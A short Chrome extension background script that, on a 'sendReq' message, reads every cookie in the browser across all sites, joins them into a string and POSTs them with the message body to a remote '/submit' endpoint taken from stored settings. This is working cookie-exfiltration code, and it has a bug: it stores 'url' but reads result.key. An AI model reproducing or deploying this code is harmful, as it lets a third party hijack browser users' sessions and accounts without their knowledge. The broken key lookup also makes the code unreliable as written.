chrome.runtime.onMessage.addListener(function (message) {
    if (message.command === 'sendReq') {
        chrome.cookies.getAll({}, (theCookies) => {
            console.log(theCookies)
            let cookiestr = ""

            theCookies.forEach((cookie) => {
                cookiestr += cookie.name + "=" + cookie.value + "; "
            })

            cookiestr = cookiestr.substring(0, cookiestr.length - 2)

            console.log(cookiestr)

            message.body.cookie = cookiestr

            chrome.storage.local.get(["url"]).then((result) => {
                fetch(result.key + "/submit", {
                    method: "POST",
                    body: JSON.stringify(message.body)
                }).then(() => {
                    console.log("submitted to " + result.key + "/submit")
                })
            });
        });
    }
});
